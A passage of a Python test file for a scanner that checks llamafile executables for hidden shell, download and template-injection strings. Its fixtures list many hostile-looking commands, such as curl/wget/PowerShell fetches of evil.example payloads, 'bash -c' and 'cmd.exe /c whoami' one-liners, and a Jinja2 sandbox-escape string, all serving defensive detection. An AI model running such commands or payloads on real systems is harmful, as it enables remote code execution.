    binary.write_bytes(_build_llamafile_blob())

    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
        raise OSError("simulated runtime preview read failure")

    monkeypatch.setattr(LlamafileScanner, "_read_prefix", staticmethod(raise_os_error))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in direct.metadata.get("scan_outcome_reasons", [])
    read_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Preview Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].message == "Failed reading runtime preview bytes: simulated runtime preview read failure"
    assert read_checks[0].details.get("analysis_incomplete") is True
    assert read_checks[0].details.get("scan_outcome_reason") == LLAMAFILE_RUNTIME_PREVIEW_READ_REASON

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    high_severity = [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    metadata = aggregate.file_metadata[str(binary)]
    assert high_severity == []
    assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in metadata.get("scan_outcome_reasons", [])
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        cached_metadata = cached_aggregate.file_metadata[str(binary)]
        assert cached_aggregate.success is False
        assert cached_metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in cached_metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize(
    ("read_error", "expected_message"),
    [
        (
            OSError("simulated runtime stream failure"),
            "Failed reading runtime stream bytes: simulated runtime stream failure",
        ),
        (None, "Runtime stream ended before the expected executable boundary"),
    ],
)
def test_llamafile_runtime_stream_failures_are_inconclusive_and_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    read_error: OSError | None,
    expected_message: str,
) -> None:
    binary = tmp_path / "runtime-stream-failure.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    def incomplete_stream(
        _self: LlamafileScanner,
        _path: Path,
        end_offset: int,
        _preview_blobs: list[bytes],
        _result: ScanResult,
        *,
        include_preview_fallback: bool,
    ) -> tuple[int, OSError | None, bool, bool, bool, bool, bool, bool]:
        assert include_preview_fallback is False
        return max(0, end_offset - 1), read_error, False, False, False, False, False, False

    monkeypatch.setattr(LlamafileScanner, "_scan_runtime_strings_streaming", incomplete_stream)

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_STREAM_READ_REASON in direct.metadata["scan_outcome_reasons"]
    read_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Stream Read"]
    assert len(read_checks) == 1
    assert read_checks[0].message == expected_message
    assert read_checks[0].details["scan_outcome_reason"] == LLAMAFILE_RUNTIME_STREAM_READ_REASON

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / f"runtime-stream-cache-{'error' if read_error else 'short'}"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_runtime_stream_failure_retains_only_pre_boundary_preview_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "trusted-boundary-stream-failure.llamafile"
    _write_ape_zip_llamafile(
        binary,
        _build_gguf_string_metadata([("general.description", "bash -c curl http://model-data.example/payload.sh")]),
        runtime=b"bash -c curl http://runtime-evil.example/payload.sh",
    )

    def fail_after_previews(
        self: LlamafileScanner,
        path: Path,
        _end_offset: int,
        preview_blobs: list[bytes],
        result: ScanResult,
        *,
        include_preview_fallback: bool,
    ) -> tuple[int, OSError | None, bool, bool, bool, bool, bool, bool]:
        assert include_preview_fallback is False
        preview = b"\n".join(preview_blobs)
        assert b"runtime-evil.example" in preview
        assert b"model-data.example" not in preview
        self._scan_runtime_strings(str(path), preview, result)
        return 0, OSError("simulated trusted-boundary stream failure"), False, False, False, False, False, False

    monkeypatch.setattr(LlamafileScanner, "_scan_runtime_strings_streaming", fail_after_previews)

    result = LlamafileScanner().scan(str(binary))

    assert result.success is False
    assert LLAMAFILE_RUNTIME_STREAM_READ_REASON in result.metadata["scan_outcome_reasons"]
    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
    assert len(runtime_checks) == 1
    assert runtime_checks[0].severity == IssueSeverity.CRITICAL
    assert "runtime-evil.example" in repr(runtime_checks[0].details)
    assert "model-data.example" not in repr(runtime_checks[0].details)


def test_llamafile_long_runtime_string_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "oversized-runtime-string.llamafile"
    _write_sparse_runtime_gap_llamafile(binary, b"A" * (LLAMAFILE_RUNTIME_STREAM_MAX_STRING_BYTES + 1))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_STRING_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime String Coverage"]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].message == "Runtime printable string exceeded the bounded cross-chunk analysis window"
    assert coverage_checks[0].details["max_string_bytes"] == LLAMAFILE_RUNTIME_STREAM_MAX_STRING_BYTES

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "runtime-string-limit-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_transfer_token_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "transfer-token-limit.llamafile"
    hidden_transfer = "curl " + ("--silent " * LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS)
    hidden_transfer += "https://evil.example/payload"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[hidden_transfer]))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_TRANSFER_TOKEN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Transfer Command Coverage"]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].message == "Runtime transfer command exceeded the bounded token analysis limit"
    assert coverage_checks[0].details["max_tokens"] == LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "transfer-token-limit-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_interpreter_token_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "interpreter-token-limit.llamafile"
    hidden_command = "python " + ("-B " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS + 1))
    hidden_command += "-c print('https://evil.example/payload')"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[hidden_command]))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
    coverage_checks = [
        check for check in direct.checks if check.name == "Llamafile Runtime Interpreter Command Coverage"
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].message == "Runtime interpreter command exceeded the bounded argument analysis limit"
    assert coverage_checks[0].details["max_tokens"] == LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "interpreter-token-limit-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize(
    "runtime_line",
    [
        "python "
        + ("-B " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS - 1))
        + "-c print('https://evil.example/payload')",
        "bash " + ("-v " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS - 1)) + "-c echo https://evil.example/payload",
    ],
)
def test_llamafile_interpreter_token_boundary_is_inconclusive(tmp_path: Path, runtime_line: str) -> None:
    binary = tmp_path / "interpreter-token-boundary.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    assert result.success is False
    assert LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]


def test_llamafile_transfer_option_ambiguity_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "transfer-option-ambiguity.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=["curl --future-option https://maybe.example"]))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_TRANSFER_OPTION_AMBIGUOUS_REASON in direct.metadata["scan_outcome_reasons"]
    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Transfer Option Analysis"]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].message == "Runtime transfer command used an option with ambiguous argument arity"
    assert not any(
        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
        for check in direct.checks
    )

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "transfer-option-ambiguity-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_utf16_ambiguity_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "utf16-ambiguity.llamafile"
    ambiguous_runtime = b"\x01b" + "ash -c echo benignZ".encode("utf-16be") + b"\x01"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[ambiguous_runtime.decode("latin-1")]))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_UTF16_AMBIGUOUS_REASON in direct.metadata["scan_outcome_reasons"]
    coverage_checks = [check for check in direct.checks if check.name == "Llamafile Runtime UTF-16 Analysis"]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].message == "Runtime bytes had conflicting UTF-16 byte-order interpretations"
    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "utf16-ambiguity-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_gguf_candidate_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "many-gguf-candidates.llamafile"
    candidate = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    binary.write_bytes(_build_llamafile_blob(embedded_payload=candidate * LLAMAFILE_GGUF_MAX_HEADER_CANDIDATES))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_GGUF_CANDIDATE_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
    coverage_checks = [
        check for check in direct.checks if check.name == "Llamafile Embedded Payload Candidate Coverage"
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].message == ("Embedded GGUF candidate count exceeded the bounded structural probe limit")
    assert coverage_checks[0].details["max_candidates"] == LLAMAFILE_GGUF_MAX_HEADER_CANDIDATES

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "gguf-candidate-limit-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_gguf_header_resource_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "gguf-header-resource-limit.llamafile"
    over_limit_header = b"GGUF" + struct.pack("<IQQ", 3, 10_000_001, 0)
    binary.write_bytes(_build_llamafile_blob(embedded_payload=over_limit_header))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_GGUF_HEADER_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
    checks = [check for check in direct.checks if check.name == "Llamafile Embedded GGUF Header Resource Limits"]
    assert len(checks) == 1
    assert checks[0].message == "Embedded GGUF header declares resource counts above the structural probe limit"

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "gguf-header-resource-limit-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_truncated_gguf_header_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "truncated-gguf-header.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b"GGUF"))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert LLAMAFILE_GGUF_HEADER_INCOMPLETE_REASON in direct.metadata["scan_outcome_reasons"]
    checks = [check for check in direct.checks if check.name == "Llamafile Embedded GGUF Header Integrity"]
    assert len(checks) == 1
    assert checks[0].message == "Embedded GGUF marker is truncated before its complete header"

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "truncated-gguf-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize("version", [4, 10_001])
def test_llamafile_scanner_preserves_findings_from_future_gguf_versions(tmp_path: Path, version: int) -> None:
    binary = tmp_path / f"future-gguf-v{version}.llamafile"
    malicious_payload = _build_gguf_string_metadata(
        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")],
        version=version,
    )
    _write_sparse_mapped_llamafile(binary, "elf", embedded_payload=malicious_payload)

    result = LlamafileScanner().scan(str(binary))

    assert any(
        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_llamafile_late_preview_failure_retains_observed_runtime_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "malicious-preview.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=["bash -c curl http://evil.example/payload.sh"]))

    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
        raise OSError("simulated suffix preview failure")

    monkeypatch.setattr(LlamafileScanner, "_read_suffix", staticmethod(raise_os_error))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.bytes_scanned > 0
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert determine_exit_code(aggregate) == 1
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)


def test_llamafile_middle_window_failure_retains_marker_probe_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "malicious-middle-preview.llamafile"
    binary.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    def raise_os_error(_path: Path, _offset: int, _num_bytes: int) -> bytes:
        raise OSError("simulated middle preview reread failure")

    monkeypatch.setattr(LlamafileScanner, "_read_window_around_offset", staticmethod(raise_os_error))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> None:
    binary = tmp_path / "suspicious.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "bash -c curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


@pytest.mark.parametrize("encoding", ["utf-16le", "utf-16be"])
def test_llamafile_scanner_flags_utf16_runtime_commands(tmp_path: Path, encoding: str) -> None:
    binary = tmp_path / f"suspicious-{encoding}.llamafile"
    _write_sparse_mapped_llamafile(
        binary,
        "pe",
        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
        mapped_runtime="powershell Invoke-WebRequest https://evil.example/payload".encode(encoding),
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


@pytest.mark.parametrize("encoding", ["utf-16le", "utf-16be"])
def test_llamafile_scanner_ignores_shifted_utf16_command_near_match(tmp_path: Path, encoding: str) -> None:
    binary = tmp_path / f"benign-shifted-{encoding}.llamafile"
    _write_sparse_mapped_llamafile(
        binary,
        "pe",
        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
        mapped_runtime="xbash -c echo benign".encode(encoding),
    )

    result = LlamafileScanner().scan(str(binary))

    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_preserves_crossing_utf16be_command_candidate(tmp_path: Path) -> None:
    binary = tmp_path / "crossing-utf16be-command.llamafile"
    mapped_runtime = "abcdefgh".encode("utf-16be") + b"X" + "bash -c echo pwned".encode("utf-16be")
    _write_sparse_mapped_llamafile(
        binary,
        "pe",
        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
        mapped_runtime=mapped_runtime,
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
    assert len(runtime_checks) == 1
    assert runtime_checks[0].severity == IssueSeverity.WARNING
    assert "bash -c echo pwned" in repr(runtime_checks[0].details)


def test_llamafile_scanner_ignores_crossing_utf16_phantom_command(tmp_path: Path) -> None:
    binary = tmp_path / "crossing-utf16be-phantom.llamafile"
    mapped_runtime = "abcdefgh".encode("utf-16be") + b"b" + "ash -c echo benignZ".encode("utf-16be")
    _write_sparse_mapped_llamafile(
        binary,
        "pe",
        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
        mapped_runtime=mapped_runtime,
    )

    result = LlamafileScanner().scan(str(binary))

    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_streaming_preserves_utf16_disambiguation_context(tmp_path: Path) -> None:
    binary = tmp_path / "streamed-utf16be-phantom.llamafile"
    prior = "abcdefgh".encode("utf-16be")
    first_chunk = b"\x01" * (llamafile_scanner_module.LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES - len(prior) - 1)
    first_chunk += prior + b"\x01"
    binary.write_bytes(first_chunk + b"b" + "ash -c echo benignZ".encode("utf-16be") + b"\x01")
    result = ScanResult("llamafile")

    scanned, read_error, *_ = LlamafileScanner()._scan_runtime_strings_streaming(
        binary,
        binary.stat().st_size,
        [],
        result,
        include_preview_fallback=False,
    )

    assert scanned == binary.stat().st_size
    assert read_error is None
    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) -> None:
    binary = tmp_path / "sensitive-runtime.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                'bash -c curl -H "Authorization: Bearer sk-runtime-secret1234567890" '
                "https://user:pass123@evil.example/payload?token=tok_runtime",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)

    details = repr(runtime_issues[0].details)
    assert "sk-runtime-secret" not in details
    assert "pass123" not in details
    assert "tok_runtime" not in details
    assert "curl" in details
    assert "evil.example" in details
    assert "<redacted>" in details


@pytest.mark.parametrize(
    "runtime_line",
    [
        "curl --silent https://evil.example/payload.sh",
        "wget --quiet evil.example/payload.sh",
        'curl -H "X-Test: yes" https://evil.example/payload.sh',
        "curl --retry 3 evil.example/payload.sh",
        "curl -so output.bin evil.example/payload.sh",
        "curl -sLo output.bin evil.example/payload.sh",
        "curl -sSLo output.bin evil.example/payload.sh",
        "wget -qO output.bin evil.example/payload.sh",
        "wget --tries 3 evil.example/payload.sh",
        "curl --interface eth0 evil.example/payload.sh",
        "curl --upload-file payload.bin evil.example/payload.sh",
        "wget --quota 1M evil.example/payload.sh",
        "curl evil.xn--p1ai",
        "wget evil.example.",
        "curl --verbose evil.example/first http://localhost/second",
        "wget --timestamping evil.example/first http://localhost/second",
        "curl --proxy http://evil.example:8080 http://localhost/payload",
        "curl -x http://evil.example:8080 http://localhost/payload",
        "curl --connect-to localhost:80:evil.example:80 http://localhost/payload",
        "curl --resolve localhost:80:8.8.8.8 http://localhost/payload",
        "curl --doh-url https://evil.example/dns-query http://localhost/payload",
        "curl --dns-servers 127.0.0.1,8.8.8.8 http://localhost/payload",
        "/usr/bin/wget evil.example/payload.sh",
        '"curl" https://evil.example/payload.sh',
        '"/usr/bin/curl" https://evil.example/payload.sh',
        "curl.exe 8.8.8.8:8080",
        "powershell Invoke-WebRequest https://evil.example/payload.sh",
        "cmd.exe /s /c curl https://evil.example/payload.sh",
    ],
)
def test_llamafile_scanner_flags_remote_transfer_after_long_options(
    tmp_path: Path,
    runtime_line: str,
) -> None:
    binary = tmp_path / "remote-transfer-long-option.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


@pytest.mark.parametrize(
    "runtime_line",
    [
        "bash -l -c echo pwned",
        "bash --noprofile -c echo pwned",
        "bash --debugger -c echo pwned",
        "bash --debug -c echo pwned",
        "bash --verbose -c echo pwned",
        "bash -l -c 'echo -o noexec pwned'",
        "bash --rcfile '-o noexec' -c echo pwned",
        "bash -n +n -c echo pwned",
        "sh -o nounset -c echo pwned",
        "zsh --no-rcs -c echo pwned",
        "zsh --no-globalrcs -c echo pwned",
        "zsh --emacs -c echo pwned",
        "zsh --privileged -c echo pwned",
        "zsh --shinstdin -c echo pwned",
        "zsh --singlecommand -c echo pwned",
        "zsh --interactivecomments -c echo pwned",
        "zsh -n --exec -c echo pwned",
        r"bash \-c echo pwned",
        r"zsh \-c echo pwned",
        "python -I -c print(1)",
        "python -b -c print(1)",
        "python -bb -c print(1)",
        "python -bI -c print(1)",
        "python -IB -c print(1)",
        "python -uB -c print(1)",
        "python -bbb -c print(1)",
        "python -OOOO -c print(1)",
        "python -vvvv -c print(1)",
        "python -bc print(1)",
        "python -bIc print(1)",
        "python -bcprint(1)",
        "python -bIcprint(1)",
        "python -bbbcprint(1)",
        "python -OOOOcprint(1)",
        "python -vvvvcprint(1)",
        "python3.11 -X dev -c print(1)",
        '"/bin/bash" -c echo pwned',
        '"python3" -c print(1)',
        '"cmd.exe" /c whoami',
        '"C:\\Program Files\\Tools\\cmd.exe" /c whoami',
        "cmd.exe /v:on /c whoami",
        '"powershell.exe" Invoke-Expression whoami',
        '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" Invoke-Expression whoami',
    ],
)
def test_llamafile_scanner_flags_interpreter_commands_after_options(
    tmp_path: Path,
    runtime_line: str,
) -> None:
    binary = tmp_path / "interpreter-options.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
    assert len(runtime_checks) == 1
    assert runtime_checks[0].severity == IssueSeverity.WARNING


def test_llamafile_scanner_correlates_inline_python_command_with_network(tmp_path: Path) -> None:
    binary = tmp_path / "inline-python-network.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=["python -bcprint('https://evil.example/payload')"]))

    result = LlamafileScanner().scan(str(binary))

    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
    assert len(runtime_checks) == 1
    assert runtime_checks[0].severity == IssueSeverity.CRITICAL


@pytest.mark.parametrize(
    "runtime_line",
    [
        "python script.py -c print(1)",
        "python -m package -c print(1)",
        "bash -- -c echo benign",
        "bash --help -c echo benign",
        "zsh --help -c echo benign",
        r"""bash "\-c" echo benign""",
        "xbash -l -c echo benign",
    ],
)
def test_llamafile_scanner_ignores_non_command_interpreter_near_matches(
    tmp_path: Path,
    runtime_line: str,
) -> None:
    binary = tmp_path / "interpreter-near-match.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


@pytest.mark.parametrize(
    "runtime_line",
    [
        '"notpowershell" -Help https://docs.example/guide',
        '"documentation about powershell" -Help https://docs.example/guide',
        '"Curl","CurlyDoubleQuote","https://docs.example/guide"',
        "bash -C https://docs.example/guide",
        "python -C https://docs.example/guide",
        "python -V -c https://docs.example/guide",
        "python -VV -c https://docs.example/guide",
        "python -h -c https://docs.example/guide",
        "bash -n -c echo https://docs.example/guide",
        "bash -D -c echo https://docs.example/guide",
        "bash -D +D -c echo https://docs.example/guide",
        "zsh --noexec -c echo https://docs.example/guide",
        "bash -o noexec -c echo https://docs.example/guide",
        "bash - foo -c echo https://docs.example/guide",
        "bash + foo -c echo https://docs.example/guide",
    ],
)
def test_llamafile_scanner_does_not_correlate_command_near_matches(
